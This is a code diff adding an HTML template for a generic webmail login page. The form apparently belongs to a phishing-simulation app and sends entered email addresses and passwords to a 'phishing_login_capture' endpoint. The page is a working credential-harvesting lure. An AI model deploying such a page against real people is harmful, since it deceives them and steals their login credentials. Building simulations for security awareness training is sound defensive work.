@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Webmail Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        /* [your CSS from before] */
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Email Login</h2>
+        <form method="POST" action="{% url 'phishing_login_capture' log.id %}">
+            {% csrf_token %}
+            <div class="form-group">
+                <label>Email Address</label>
+                <input type="email" name="email" placeholder="you@example.com" required>
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="login-btn">Sign In</button>
+        </form>
+        <div class="footer">
+            &copy; 2025 Webmail Services
+        </div>
+    </div>
+</body>
+</html>
